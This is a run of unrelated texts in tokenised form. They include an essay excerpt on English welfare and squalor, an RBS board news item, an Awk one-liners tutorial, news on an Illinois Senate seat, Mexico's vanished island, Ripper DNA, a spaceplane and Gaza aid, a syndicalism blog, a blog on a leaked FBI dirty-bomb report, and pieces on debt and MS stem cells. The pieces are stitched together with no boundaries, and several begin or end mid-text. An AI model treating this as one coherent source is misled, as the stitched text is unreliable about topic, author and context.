He said it was not : that her problem was that she accepted no limits to her own behavior , that she did not fear the possibility of hunger , the condemnation of her own parents or neighbors , or God .
In other words , the squalor of England was not economic but spiritual , moral , and cultural .
I often take my doctors from the Third World on the short walk from the hospital to the prison nearby .
It is a most instructive 800 yards .
On a good day — good for didactic purposes , that is — there are seven or eight puddles of glass shattered into fragments lying in the gutter en route ( there are never none , except during the most inclement weather , when even those most addicted to car theft control their impulses ) .
" Each of these little piles of smashed glass represents a car that has been broken into , " I tell them .
" There will be more tomorrow , weather permitting . "
The houses along the way are , as public housing goes , quite decent .
The local authorities have at last accepted that herding people into giant , featureless , Le Corbusian concrete blocks was a mistake , and they have switched to the construction of individual houses .
Only a few of their windows are boarded up .
Certainly by comparison with housing for the poor in Bombay , Madras , or Manila they are spacious and luxurious indeed .
Each has a little front yard of grass , surrounded by a hedge , and a much larger back yard ; about half have satellite dishes .
Unfortunately , the yards are almost as full of litter as municipal garbage dumps .
I tell my doctors that in nearly nine years of taking this walk four times a week , I have never seen a single instance of anyone attempting to clean his yard .
But I have seen much litter dropped ; on a good day , I can even watch someone standing at the bus stop dropping something on the ground no farther than two feet from the bin .
" Why do n't they tidy up their gardens ? " asks a doctor from Bombay .
A good question : after all , most of the houses contain at least one person with time on his or her hands .
Whenever I have been able to ask the question , however , the answer has always been the same : I 've told the council [ the local government ] about it , but they have n't come .
As tenants , they feel it is the landlord 's responsibility to keep their yards clean , and they are not prepared to do the council 's work for it , even if it means wading through garbage — as it quite literally does .
On the one hand , authority cannot tell them what to do ; on the other , it has an infinitude of responsibilities towards them .
I ask my Third World doctors to examine the litter closely .
It gives them the impression that no Briton is able to walk farther than ten yards or so without consuming junk food .
Every bush , every lawn , even every tree , is festooned with chocolate wrappers or fast - food packaging .
Empty cans of beer and soft drinks lie in the gutter , on the flower beds , or on top of the hedges .
Again , on a good day we actually see someone toss aside the can whose contents he has just consumed , as a Russian vodka drinker throws down his glass .
Apart from the antisocial disregard of the common good that each little such act of littering implies ( hundreds a week in the space of 800 yards alone ) , the vast quantity of food consumed in the street has deeper implications .
I tell the doctors that in all my visits to the white households in the area , of which I 've made hundreds , never — not once — have I seen any evidence of cooking .
The nearest to this activity that I have witnessed is the reheating of prepared and packaged food , usually in a microwave .
And by the same token , I have never seen any evidence of meals taken in common as a social activity — unless two people eating hamburgers together in the street as they walk along be counted as social .
This is not to say that I have n't seen people eating at home ; on the contrary , they are often eating when I arrive .
They eat alone , even if other members of the household are present , and never at table ; they slump on a sofa in front of the television .
Everyone in the household eats according to his own whim and timetable .
Even in so elementary a matter as eating , therefore , there is no self - discipline but rather an imperative obedience to impulse .
Needless to say , the opportunity for conversation or sociality that a meal taken together provides is lost .
English meals are thus solitary , poor , nasty , brutish , and short .
I ask the doctors to compare the shops in areas inhabited by poor whites and those where poor Indian immigrants live .
It is an instructive comparison .
The shops the Indians frequent are piled high with all kinds of attractive fresh produce that , by supermarket standards , is astonishingly cheap .
The women take immense trouble over their purchases and make subtle discriminations .
There are no pre-cooked meals for them .
By contrast , a shop that poor whites patronize offers a restricted choice , largely of relatively expensive prepared foods that at most require only the addition of hot water .
The difference between the two groups cannot be explained by differences in income , for they are insignificant .
Poverty is n't the issue .
And the willingness of Indians to take trouble over what they eat and to treat meals as important social occasions that impose obligations and at times require the subordination of personal desire is indicative of an entire attitude to life that often permits them , despite their current low incomes , to advance up the social scale .
Alarmingly , though , the natural urge of the children of immigrants to belong to the predominant local culture is beginning to create an Indian underclass ( at least among young males ) : and the taste for fast food and all that such a taste implies is swiftly developing among them .
When such slovenliness about food extends to all other spheres of life , when people satisfy every appetite with the same minimal effort and commitment , no wonder they trap themselves in squalor .
I have little trouble showing my doctors from India and the Philippines that most of our patients take a fast - food approach to all their pleasures , obtaining them no less fleetingly and unstrenuously .
They have no cultural activity they can call their own , and their lives seem , even to them , empty of purpose .
In the welfare state , mere survival is not the achievement that it is , say , in the cities of Africa , and therefore it cannot confer the self - respect that is the precondition of self - improvement .
By the end of three months my doctors have , without exception , reversed their original opinion that the welfare state , as exemplified by England , represents the acme of civilization .
On the contrary , they see it now as creating a miasma of subsidized apathy that blights the lives of its supposed beneficiaries .
They come to realize that a system of welfare that makes no moral judgments in allocating economic rewards promotes antisocial egotism .
The spiritual impoverishment of the population seems to them worse than anything they have ever known in their own countries .
And what they see is all the worse , of course , because it should be so much better .
The wealth that enables everyone effortlessly to have enough food should be liberating , not imprisoning .
Instead , it has created a large caste of people for whom life is , in effect , a limbo in which they have nothing to hope for and nothing to fear , nothing to gain and nothing to lose .
It is a life emptied of meaning .
" On the whole , " said one Filipino doctor to me , " life is preferable in the slums of Manila . "
He said it without any illusions as to the quality of life in Manila .
These doctors have made the same journey as I , but in the reverse direction .
Arriving as a young doctor in Africa 25 years ago , I was horrified at first by the physical conditions , the like of which I had never experienced before .
Patients with heart failure walked 50 miles in the broiling sun , with panting breath and swollen legs , to obtain treatment — and then walked home again .
Ulcerating and suppurating cancers were common .
Barefoot men contracted tetanus from the wounds inflicted by a sand flea that laid its eggs between their toes .
Tuberculosis reduced people to animated skeletons .
Children were bitten by puff adders and adults mauled by leopards .
I saw lepers with noses that had rotted away and madmen who wandered naked in the torrential rains .
Even the accidents were spectacular .
I treated the survivors of one in Tanzania in which a truck — having no brakes , as was perfectly normal and expected in the circumstances — began to slide backward down a hill it had been climbing .
It was laden with bags of corn , upon which 20 passengers , including many children , were riding .
As the truck slid backward , first the passengers , then the corn , fell off .
By the time I arrived , ten dead children were lined up by the side of the road , arranged in ascending order as neatly as organ pipes .
They had been crushed or suffocated by the bags of corn that fell on top of them : a grimly ironic death in a country chronically short of food .
Moreover , political authority in the countries in which I worked was arbitrary , capricious , and corrupt .
In Tanzania , for example , you could tell the representative of the sole and omnipotent political party , the Party of the Revolution , by his girth alone .
Tanzanians were thin , but party men were fat .
The party representative in my village sent a man to prison because the man 's wife refused to sleep with him .
In Nigeria the police hired out their guns by night to the armed robbers .
Yet nothing I saw — neither the poverty nor the overt oppression — ever had the same devastating effect on the human personality as the undiscriminating welfare state .
I never saw the loss of dignity , the self - centeredness , the spiritual and emotional vacuity , or the sheer ignorance of how to live , that I see daily in England .
In a kind of pincer movement , therefore , I and the doctors from India and the Philippines have come to the same terrible conclusion : that the worst poverty is in England — and it is not material poverty but poverty of soul .
Sir Philip Hampton , the new chairman of Royal Bank of Scotland , is wielding the axe in the loss - making bank 's boardroom in a determined effort to exert his authority over the troubled operation .
Seven non-executives are expected to leave the board as Hampton roots out some of the longest - standing members of a board that presided over as many as 24 acquisitions during the eight years in which ousted chief executive Sir Fred Goodwin was at the helm .
The taxpayer will soon own 70 % of the bank .
The dramatic clear - out of the RBS board will include the long - standing non-executive directors Peter Sutherland and Bob Scott , the senior independent director who was the main point of communication for disgruntled shareholders .
The former Treasury mandarin Sir Steve Robson is also expected to depart along with Jim Currie , Janis Kong , Charles Koch and Bill Friedrich .
Their departures will signal a major change in the management of RBS , which the former chairman Sir Tom McKillop was forced to defend last year when he declared there were " no patsies " on the board .
Three new government - approved non-executive directors will join the board as stipulated by the government as a condition for the injection of £ 20bn of taxpayer funds .
Those appointments were being finalised last night and could be announced as soon as today .
The boardroom cull will leave only two executive directors from the Goodwin regime .
Guy Whittaker , the finance director , who joined in 2006 , and Gordon Pell , who runs the retail operations after joining RBS from Lloyds TSB during its hostile bid for NatWest in 2000 , are expected to remain .
Five of the existing non-executive directors will survive , including Colin Buchan , who has been on the board since June 2002 and who will become the longest - serving non-executive director .
Stephen Hester , the newly installed chief executive , signalled a boardroom overhaul last month when he warned that the bank was on track to record the biggest loss in British corporate history , of about £ 28 bn .
But the speed of the changes may surprise some in the City .
They follow the move this week by McKillop to relinquish the chairman 's seat two months earlier than planned .
He is preparing to appear before the Treasury select committee of MPs next week with Goodwin and the ousted HBOS bosses Andy Hornby and Lord Stevenson .
Hester is determined to press ahead with the strategic review he embarked on when he was parachuted into RBS in November .
He has already begun to unravel the strategy of his predecessors by selling off a stake in Bank of China and yesterday calling off the sale of insurance businesses Churchill and Direct Line .
RBS told the stock exchange that it was " no longer in discussions with interested parties regarding a possible disposal of the business " , which Goodwin was forced to put up for auction last year in a desperate attempt to raise capital .
The bank declined to comment on any boardroom changes .
Hester hinted last month that he was inclined to keep the highly regarded business , when he admitted that the profits being generated by the insurance arm and retail bank would be wiped out by £ 8bn of credit crunch hits on the corporate bank .
The move will help ease the uncertainty for the 17,000 people employed in the insurance operation , which includes not only Direct Line and Churchill but also Privilege , Green Flag and NIG .
RBS acknowledged that while the insurance arm had " its operating challenges " , it would " exhibit more stability than our banking businesses during the current negative credit cycle " .
Hester said : " It is an impressive , well - run business with great people and excellent customer franchises .
It can play an important role as we return the RBS group to standalone strength . "
Hester is also reviewing all aspects of the RBS business , which spans the globe and has extensive investment banking business following the acquisition of ABN Amro as the credit crunch began to bite 18 months ago .
The boardroom purge should make it easier to push through change .
The other executive directors on the board for much of Goodwin 's tenure have already gone or are about to leave .
The retirement of Larry Fish , who ran the US operations , which grew rapidly through acquisition , was already due in April , while Mark Fisher , who oversaw the integration of ABN Amro , left to join the new Lloyds Banking Group .
Johnny Cameron , who ran the global markets division , has already left the board and will leave the bank later this month .
This is an update post to my three - part article Awk One - Liners Explained .
I received an email from Eric Pement ( the original author of Awk one - liners ) and he said that he just published a new version of awk1 line .
txt file .
I did a diff and found that there were seven new one - liners in it !
The new file has two new sections String Creation and Array Creation , and it also updates Selective Printing of Certain Lines section .
I 'll explain the new one - liners in this article .
Here is the latest version of awk1 line .
txt – awk1 line - new.txt .
The original Eric Pement 's
Awk one - liner collection consists of five sections , and I explained them in my previous three articles :
Awesome news : I have written an e-book based on this article series .
Check it out :
Okay , let 's roll with the new one - liners !
String Creation
1. Create a string of a specific length ( generate a string of x's of length 513 ) .
awk ' BEGIN { while ( a++< 513 ) s=s " x " ; print s } '
This one - liner uses the " BEGIN { } " special block that gets executed before anything else in an Awk program .
In this block a while loop appends character " x " to variable " s " 513 times .
After it has looped , the " s " variable gets printed out .
As this Awk program does not have a body , it quits after executing the BEGIN block .
This one - liner printed the 513 x's out , but you could have used it for anything you want in BEGIN , main program or END blocks .
Unfortunately this is not the most effective way to do it .
It 's a linear time solution .
My friend waldner ( who , by the way , wrote a guest post on 10 Awk Tips , Tricks and Pitfalls ) showed me a solution that 's logarithmic time ( based on idea of recursive squaring ) :
function rep( str , num , remain , result ) { if ( num < 2 ) { remain = ( num == 1 ) } else { remain = ( num % 2 == 1 ) result = rep( str , ( num - remain ) / 2 ) } return result result ( remain ? str : " " ) }
This function can be used as following :
awk ' BEGIN { s = rep ( " x " , 513 ) }'
2. Insert a string of specific length at a certain character position ( insert 49 x's after 6th char ) .
gawk -- re-interval ' BEGIN { while ( a++< 49 ) s=s " x " } ; { sub ( / ^.{6} / , " & " s ) } ; 1 '
This one - liner works only with Gnu Awk , because it uses the interval expression " .{ 6} " in the Awk program 's body .
Interval expressions were not traditionally available in awk , that 's why you have to use " - - re- interval " option to enable them .
For those that do not know what interval expressions are , they are regular expressions that match a certain number of characters .
For example , " .{ 6} " matches any six characters ( the any char is specified by the dot " . " ) .
An interval expression " b{ 2,4} " matches at least two , but not more than four " b " characters .
To match words , you have to give them higher precedence - " ( foo ) { 4} " matches " foo " repeated four times - " foofoofoofoo " .
The one - liner starts the same way as the previous - it creates a 49 character string " s " in the BEGIN block .
Next , for each line of the input , it calls sub ( ) function that replaces the first 6 characters with themselves and " s " appended .
The " & " in the sub ( ) function means the matched part of regular expression .
The ' " & " s' means matched part of regex and contents of variable " s " .
The " 1 " at the end of whole Awk one - liner prints out the modified line ( it 's syntactic sugar for just " print " ( that itself is syntactic sugar for " print $ 0 " ) ) .
The same can be achieved with normal standard Awk :
awk ' BEGIN { while ( a++< 49 ) s=s " x " } ; { sub ( / ^....../ , " & " s ) } ; 1
Here we just match six chars " ...... " at the beginning of line , and replace them with themselves + contents of variable " s " .
It may get troublesome to insert a string at 29th position for example ...
You 'd have to go tapping " . " twenty - nine times " ............................. " .
Better use Gnu Awk then and write " .{ 29} " .
Once again , my friend waldner corrected me and pointed to Awk Feature Comparsion chart .
The chart suggests that the original one - liner with " .{ 6} " would also work with POSIX awk , Busybox awk , and Solaris awk .
Array Creation
3. Create an array from string .
split( " Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec " , month , " " )
This is not a one - liner per se but a technique to create an array from a string .
The split( Str , Arr , Regex ) function is used do that .
It splits string Str into fields by regular expression Regex and puts the fields in array Arr .
The fields are placed in Arr [ 1 ] , Arr [ 2 ] , ... , Arr [ N ] .
The split ( ) function itself returns the number of fields the string was split into .
In this piece of code the Regex is simply space character " " , the array is month and string is " Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec " .
After the split , month [ 1 ] is " Jan " , month [ 2 ] is " Feb " , ... , month [ 12 ] is " Dec " .
4. Create an array named " mdigit " , indexed by strings .
for ( i=1 ; i< = 12 ; i++) mdigit[ month[i ] ] = i
This is another array creation technique and not a real one - liner .
This technique creates a reverse lookup array .
Remember from the previous " one - liner " that month [ 1 ] was " Jan " , ... , month [ 12 ] was " Dec " .
Now we want to the reverse lookup and find the number for each month .
To do that we create a reverse lookup array " mdigit " , such that mdigit [ " Jan " ] = 1 , ... , mdigit [ " Dec " ] = 12 .
It 's really trivial , we loop over month [ 1 ] , month [ 2 ] , ... , month [ 12 ] and set mdigit [ month [ i ] ] to i .
This way mdigit [ " Jan " ] = 1 , etc .
Selective Printing of Certain Lines
5 . Print all lines where 5th field is equal to " abc123 " .
awk ' $ 5 == " abc123 " '
This one - liner uses idiomatic
Awk - if the given expression is true , Awk prints out the line .
The fifth field is referenced by " $ 5 " and it 's checked to be equal to " abc123 " .
If it is , the expression is true and the line gets printed .
Unwinding this idiom , this one - liner is really equal to :
awk '{ if ( $ 5 == " abc123 " ) { print $ 0 } }'
6 . Print any line where field # 5 is not equal to " abc123 " .
awk ' $ 5 != " abc123 " '
This is exactly the same as previous one - liner , except it negates the comparison .
If the fifth field " $ 5 " is not equal to " abc123 " , then print it .
Unwinding it , it 's equal to :
awk '{ if ( $ 5 != " abc123 " ) { print $ 0 } }'
Another way is to literally negate the whole previous one - liner :
awk '! ( $ 5 == " abc123 " ) '
7. Print all lines whose 7th field matches a regular expression .
awk ' $ 7 ~ /^[ a - f ] /'
This is also idiomatic Awk .
It uses " ~ " operator to test if the seventh " $ 7 " field matches a regular expression " ^[ a - f ] " .
This regular expression means " all lines that start with a lower - case letter a , b , c , d , e , or f " .
awk ' $ 7 !~ /^[ a -f ] /'
This one - liner matches negates the previous one and prints all lines that do not start with a lower - case letter a , b , c , d , e , and f .
Another way to write the same is :
awk ' $ 7 ~ /^[ ^a - f ] /'
Here we negated the group of letters [ a - f ] by adding " ^ " in the group .
That 's a regex trick to know .

WASHINGTON  Amid accusations of widespread corruption , an empty seat in the United States Senate awaits a new occupant from Illinois , where the governor is not trusted to make the choice .
That was the story in 1927 , when the Senate ultimately denied a seat to Frank L. Smith because of questions surrounding his appointment by Gov. Len Small .
But it all sounds familiar today as yet another sordid tale is added to a long and colorful history of the intense machinations that come when the prize is appointment to the most exclusive of political clubs .
Given the prestige of a Senate seat and its magnetic allure to politicians , it is perhaps not surprising that when these vacancies come up , the process of awarding the office has become fraught with malfeasance and political peril .
Gov. Rod R. Blagojevich of Illinois , caught on wiretaps that were unsealed in a criminal complaint this week , might have been crude but was certainly right when he said his unfettered power to install anyone he liked in President - elect Barack Obama ’s old Senate seat was golden .
It confers a singular ability to provide admission to the lofty legislative body without the inconveniences of facing an election  or of having to raise millions of dollars to finance one .
Missing Mexican island fuels mystery
MEXICO CITY , Feb 11 ( AFP ) Feb 11 , 2009
Lawmakers in Mexico are trying to determine the whereabouts of island central to the country 's oil claims , which appears literally to have dropped off the map about 10 years ago .
Bermeja island in the Gulf of Mexico -- a strategic marker defining US and Mexican maritime and subsea rights -- has disappeared along with documents backing up a bilateral treaty on major oil reserves in the area , fueling rumors of a CIA plot .
" There are two stories about how it disappeared : one is that global warming raised the sea level and it is under water , " said Mexican lawmaker Elias Cardenas , of the Convergence Party .
" The other is that ... it was blown up by the CIA so that the United States would get the upper hand in Hoyos de Dona " -- the oil reserves area .
Low - lying Bermeja , a smallish 80 km2 ( 31 sq miles ) , until 30 years ago was the official land point from which Mexico set its 200 nautical - mile economic zone .
The Alacranes islands now are being used as the marker , sharply reducing Mexico 's economic zone .
In June 2000 , Mexico and the United States signed a treaty putting a 10 - year moratorium on their prospecting and pumping activities in the area .
It is set to expire in 2011 .
But " we do not have information about how this accord was signed , " Cardenas said , while Bermeja north of Yucatan and Campeche states , had been mapped as far back as 1669 .
Bermeja appears in a 1998 book of Mexican islands by the Interior Ministry , but in 1997 a Navy fishing expedition reported it could not locate the island , Cardenas said .
The foreign ministry did not respond to an AFP request for comment on the case .
Miguel Angel Gonzalez Felix , a foreign ministry legal adviser when the treaty was negotiated , last June told senators the island was some 40 to 50 meters ( 120 to 150 feet ) under water .
Six days later , several Mexican senators said in a statement that " a force of nature ( able to sink an island ) does not take place without anyone noticing , and much less so when it is sitting in an area with more than 22 billion barrels of oil reserves . "
Lawmakers have demanded President Felipe Calderon account for how Bermeja Island disappeared from Mexican territory .
The notorious serial killer who stalked London 's East End , butchering prostitutes and terrorising the population , may not have been Jack the Ripper - but Jill .
An Australian scientist has used swabs from letters supposedly sent to police by the Ripper to build a partial DNA profile of the killer .
The results suggest that the person who murdered and mutilated at least five women from 1888 onwards may have been a woman .
Ian Findlay , a professor of molecular and forensic diagnostics , told the Australian Broadcasting Corporation that he had developed a profiling technique that could extract DNA from a single cell or strand of hair up to 160 years old .
Conventional DNA sampling methods require at least 200 cells .
Download the new Independent Premium app Sharing the full story , not just the headlines
Dr Findlay , who is based in Brisbane , travelled to London , where the evidence from the still - unsolved murders is stored at the National Archive .
The material , which was kept by Scotland Yard until 1961 , includes letters sent to police at the time , some of them signed " Jack the Ripper " .
Most are believed to be fakes , but a handful are thought to have been written by the killer .
Dr Findlay took swabs from the back of stamps and from the gum used to seal envelopes , and possible bloodstains .
He took his haul back to Brisbane , where - concentrating on swabs from the so - called " Openshaw letter " , the one believed most likely to be genuine - he extracted the DNA and then amplified the information to create a profile .
The resultswere " inconclusive " and not forensically reliable , but he did construct a partial profile and based on this analysis , he said , " it 's possible the Ripper could be female " .
The victims were all prostitutes , murdered and mutilated in the foggy alleyways of Whitechapel .
By the surgical nature of the wounds , the killer was assumed to have some surgical knowledge .
The chief suspects , who included a barrister , a Polish boot - maker and a Russian confidence trickster , were all men .
But Frederick Abberline , the detective who led the investigation , thought it possible the killer was a woman .
This was because the fifth victim , Mary Kelly , was " seen " by witnesses hours after she was killed .
Abberline thought this was the murderer running away , in Kelly 's clothes .
The only female suspect was Mary Pearcey , who was convicted of murdering her lover 's wife , Phoebe Hogg , in 1890 and hanged .
She apparently employed a similar modus operandi to the Ripper .
An innovative , reusable spaceplane called the Skylon is set to hit the skies within 10 years , aiming to make payload delivery and perhaps even passenger space travel easier and more affordable .
The rocket - plane would take - off and land on a traditional runway and use a combination of on - board hydrogen and oxygen taken from the atmosphere to provide thrust .
The project is led by a company called Reaction Engines Limited ( REL ) in a joint public / private program recently bolstered by a £ 900 K | € 1M | $ 1.3 M award by the European Space Agency ( ESA ) .
The spaceplane will depend on a unique air - breathing engine called SABRE , that will reduce the weight and running cost of the spacecraft by using atmospheric oxygen in the combustion process .
The Skylon will incorporate a breakthrough heat exchanger pre-cooler , able to cool extremely hot ( < 1000 C / 1832 F at Mach 5 ) intake gases to around minus 130C ( 202 F ) in a lightning fast 1/100th of a second .
The air is then compressed and forced into the rocket combustion chamber where it is mixed with hydrogen , burnt at 3000C ( 5432 F ) and expelled with great force through the back .
This is an incredible project that may even lead to rapid intercontinental flights if the numbers are right .
It could jeopardize costly space elevator projects too and I must say , would be a very stylish way to get to your space hotel .

UNITED NATIONS  John Ging , the director of operations for the United Nations refugee agency in Gaza , said Thursday that Israel ’s blockade was creating growing misery there by choking off basic humanitarian supplies like food , medicine , clothes and blankets as well as school supplies .
He also criticized the leadership of Hamas for letting its police force run wild , attacking a distribution center for the needy to cart off supplies .
“ We are neither getting in the volume nor the range of supplies that we need here , ” Mr. Ging told reporters at the United Nations , speaking via video link - up from Gaza .
“ This is creating a lot of misery among the people . ”
In one example , Mr. Ging said that the teachers in the schools run by the United Nations Relief and Works Agency had worked throughout the three - week Israeli bombardment that ended Jan. 18 to create a new human rights curriculum .
But because Israel was blocking paper supplies , the textbooks and workbooks could not be printed , so some 60 percent of the children in United Nations schools lack books .

The Barefoot Bum has written a criticism of Labour Syndicalism as a system and how it cannot suffice for a post - industrial communist society .
The core argument seems to be this :
But these questions fade into triviality beside a more subtle flaw in the idea of labor syndicalism : the system of workers controlling the means of production as the sine qua non of socialism still embodies commodity relations , only the workers are now directly transforming money to commodities to more money instead of the owners of capital doing so .
This is not to say that having workers having more control the means of production is a particularly bad idea ; it at least eliminates the most egregious form of capitalist exploitation .
That is not exactly true .
If we are talking about Communism , then money relationships or production for profit does not exist .
As such , the workers are not producing commodities in order to make more money but rather to fulfil needs of other workers .
Furthermore , the concept of exploitation does not apply at all in this situation as exploitation is simply the surplus value of a worker ’s labour going to the capitalist .
As long as the workers retains his full surplus labour ( as he would by owning the means of production ) then exploitation is impossible .
The problem of Capitalism is not simply that everything is a commodity , including labour , but rather that everything is done in the name of accumulation .
And what drives accumulation is profit .
This is further exaggerated by the need for the capitalist to accumulate in order to survive the competition with other capitalists .
But when worker syndicates own the means of production , such accumulation is impossible and the need for profit evaporates .
Why does this happen ?
Well the only reason accumulation is a guiding factor is because you can own items you do not use and then use them to extract the surplus value of other people ’s labour .
When you have a society that workers retain their own surplus value , even if you were to have a syndicate which produced a lot of value , it would n’t be able to use it to disrupt the balance of power .
They would not be able to accumulate .
The workers of any factory own the factory .
They can not buy another one and get the value of workers there .
As such labour syndicalism by it ’s very existence as the dominant sociopolitical system , immediately disrupts the Capitalist mode of production and moves the society towards Communism .
TBB also brings the issue of what happens with workers who do not produce tangible commodities , such as infinite goods ( Software for example ) .
The argument here is that as long as someone does not produce a finite good , then he has no political power in a labour syndicalist society .
But that is a wrong .
It is not the production of finite goods with exchange value that gives political power to someone , it is their ability to labour .
You have two types of objective value .
Commodities and Services .
Both of these are the result of human labour and as a result they are capable of labour syndicalism .
The mistake TBB makes here is that he consider computer software to be a type of commodity in the modern day ( due to IP ) and cannot conceive how this commodity can be valued and thus provide political power when it ’s infinite .
But the solution to this problem is that software itself is not a commodity .
Rather , software production is a service and this is what gives the worker ( programmers ) political power through their possible syndicate .
In the same way that sewer cleaners , musicians , etc retain political power as a result of their labour ’s significant effect on society .
We can see then that Labour Syndicalism does not really suffer from the issues TBB enumerates .
It can reduce the labour required to produce the same amount of commodities or services as it’s in the best interest of the people composing the syndicate to work less hours .
They are not challenged by the competitiveness of accumulation so there is no fear of going out of business .
It can achieve increased non-commodity production by treating those as services and improving their production times for the benefits of the workers .
And finally , fundamentally it can achieve the communist goal , “ from each according to her abilities , to each according to her needs . ” because the workers , unfettered by capitalist drive for profit can instead distribute their services and commodities to those who need them most .
This article of course is not to say that labour syndicalism is perfect in all regards , certainly it may be suffering from other issues such as how to implement distribution between separate syndics or how to arrange long - term planning .
But at a fundamental level ( anarcho - ) syndicalism is not flawed in regards to progressing towards communism .
Indeed , the ownership of the means of production by the owners will inherently push society towards it .

A leaked FBI report states that a man named James G. Cummings was trying to build a dirty bomb when he was shot and and killed by his wife last December 9th in Belfast , Maine .
He had plans , parts , explosive ingredients , and small quantities of radioactive material , though nothing that could not be purchased legally within the US .
Cummings was a white supremacist who was reportedly very upset about Obama ’s election .
The leaked document has been posted on Wikileaks since January 16th .
While the material concerning Cummins was first noticed by the rumor site Unattributable.com on January 19th , only yesterday was there any sort of story about it in the mainstream media , in this case the local Bangor Daily News .
Although this dastardly plot was probably not much more dangerous to the public than a garden - variety bomb , this man would certainly qualify as a bona fide “ terrorist ” under Bush - regime logic .
Or at least he would if he was Arab .
In point of fact , he actually is a threat to the public , or was .
So why have n’t we heard about it ?
Are crazy white supremacists somehow less of a threat than crazy fundamentalist muslims ?
The FBI report notes :
State authorities detected radiation emissions in four small jars in the residence labeled ‘ uranium metal ’ , as well as one jar labeled ‘ thorium . ’
The four jars of uranium carried the label of an identified US company .
Further preliminary analysis on 30 December 2008 indicated an unlabeled jar to be a second jar of thorium .
Each bottle of uranium contained depleted uranium 238 .
Analysis also indicated the two jars of thorium held thorium 232 .
Depleted uranium ( DU ) , the by - product of uranium enrichment for use in nuclear power plants or weapons , is not terribly radioactive and is reportedly not very suitable for use in a dirty bomb .
Thorium is similarly weakly radioactive , and can be purchased legally through chemical supply companies ( such as Fisher Scientific ) .
Dispersal of these isotopes would n’t exactly be healthy — they ’re both considered carcinogens , and DU has been well documented to cause birth defects , which is why the US and Israeli armies really should n’t be spraying foreign countries with DU bullets .
However , a depleted uranium / thorium bomb could n’t really be considered a weapon of mass destruction .
Still , the man was on his way to building some sort of upsetting bomb .
Aside from the nastyness of bombings of any sort , I am quite sure the headlines screaming “ radioactivity ” would n’t bother with the scientific subtleties I just covered .
I for one am glad that the FBI finally clued in — though only because these materials were found after Cummins was shot and killed by his wife , who claimed she was defending herself after years of physical and sexual abuse .
This is all very strange , and I am left with questions .
Given this foiled plot , the sadly succesful Oklahoma City bombing of 1995 , and other deranged loners such as the Unabomber , what is the actual risk to the public from foreign jihadists versus homegrown wackjobs , of which there are apparently plenty ?
[ UPDATE : See also the Texas militia with a sodium cyanide bomb in 2003 ]
Do the DHS and the FBI know the true answer to this question ?
Are they allocating their resources appropriately ?
How come we only found out about this plot accidentally ?
Again , the mainstream media still have n’t touched the story .
Would this have been an instant headline if the guy was muslim ?
If domestic terrorists do n’t count , why not ?
Is it because they ’re useless in justifying foreign wars ?
Or is mostly ignoring them the right response , implying that we are far too jumpy about terrorism in general ?
This is completely ridiculous in so many ways .
When do we , as a culture , decide to think rationally about terrorism ?
And what would a rational approach be to terrorism be ?
I suggest public health as a model , which would doubtless show that if saving lives and property is the aim , we are wasting our time and money with “ terrorism ” as compared to , oh , I do n’t know , obesity , car accidents , and global climate change .
High ratios of debt - to - GDP , usually accumulated by economic systems via aggressively financing growth with debt , are the most important factors influencing the outlook for near - term economic growth .
These ratios contribute to the initiation and continuation of financial and economic crises , reflecting massive fiscal deficits and excessive borrowing by the private sector .
High leverage and the tendency of overreliance on borrowing , diminishes the possibility of managing risk prudently , consequently leading to more debt accumulation .
The debt to GDP ratio in U.S. is in high range of 200 to 250 % while the mortgage related debt to GDP is between 75 to 100 % .
Currently at the center of economic concerns is the massive U.S. debt and whether some form of resolution ( if such a thing is still possible ) can be adopted so that it can return to sustainable levels .
But , leaving aside the fact that common sense suggests that the ratio of debt - to - GDP should not be allowed to rise year after year , and avoiding the question of how did we arrive to this point .
The persisting dilemma now consists in the fact that once macroeconomic normalization and economic fundamental improvements reach again confident levels , in terms of supporting the rate of productivity growth to a higher scale , and as the ongoing financial crisis finally finds a bottom ; are our debt levels really as stretched as most people think they are ?
Credit Swiss ’ [ CS ] debt strategists have a unique take on the subject .
They put out Friday a new report [ CS via Clusterstock ] arguing that the famous chart showing debt - to - GDP ratio in the U.S. over the last 100 years , and used to justify extreme real economic bearishness on the basis of how disastrously overleveraged the U.S. private sector has become – “ is both technically wrong , analytically meaningless – and arguably the most dangerous piece of propaganda to come out of the current crisis . ”
Original 100 Yr Debt - to - GDP chart :
Here is the revised version and how it should look as opposed to Chart 1 , which according to CS splices the two series together , using the higher number as the base :
Credit Swiss also points out in the report , with respect to the cost of servicing the debt , that with rates at historically low levels and with current servicing costs well below 10 and 20 year average ; the level of debt relative to servicing costs are reasonable .
CS concludes its argument on the subject adding – that the real problems attributed to the aggregate household sector , regarding servicing costs , lie primarily with the failure of market and funding liquidity and a non-coordinative mechanism between securitisation and mark - to - market accounting principles .

For the first time , some of the disability associated with the early stages of multiple sclerosis appears to have been reversed .
The treatment works by resetting patients ’ immune systems using their own stem cells .
While randomised clinical trials are still needed to confirm the findings , they offer new hope to people in the early stages of the disease who do n’t respond to drug treatment .
Multiple sclerosis is an autoimmune disease in which the fatty myelin sheath that wraps around nerve cells and speeds up their rate of transmission comes under attack from the body ’s own defences .
Clean slate
Richard Burt of Northwestern University Feinberg School of Medicine in Chicago and his colleagues had previously tried using stem cells to reverse this process in patients with advanced stages of the disease , with little success .
Advertisement
“ If you wait until there ’s neuro - degeneration , you ’re trying to close the barn door after the horse has already escaped , ” says Burt .
What you really want to do is stop the autoimmune attack before it causes nerve - cell damage , he adds .
In the latest trial , his team recruited 12 women and 11 men in the early relapsing - remitting stage of MS , who had not responded to treatment with the drug , interferon beta , after six months .
They removed stem cells from the patients ’ bone marrow , and then used chemicals to destroy all existing immune cells in the body , before re-injecting the stem cells .
These then developed into naïve immune cells that do not see myelin as alien , and hence do not attack it .
Three years later , 17 of the patients had improved by at least one point on a standard disability scale , while none of the patients had deteriorated .
First reversal
“ For the first time ever in the history of treating MS we have reversed disability , ” says Burt .
He cautions that more trials are needed to confirm the findings – and these are now underway – but eventually , stem cell transplantation could provide an alternative to drugs in patients who do n’t respond to them .
Transplantation also has the benefit of being a one - off treatment .
“ These are very encouraging results , and it ’s exciting to see that in this trial not only is progression of disability halted , but damage appears to be reversed , ” says Doug Brown at the UK ’s MS Society .
“ Stem cells are showing more and more potential in the treatment of MS and the challenge we now face is proving their effectiveness in trials involving large numbers of people , ” he says .

Part of a lagoon which froze over in 1708 , Venice , Italy , by Gabriele Bella ( 1733-99 ) ( Image : The Art Archive / Querini Stampalia Foundation Venice / Gianni Dagli Orti )
People across Europe awoke on 6 January 1709 to find the temperature had plummeted .
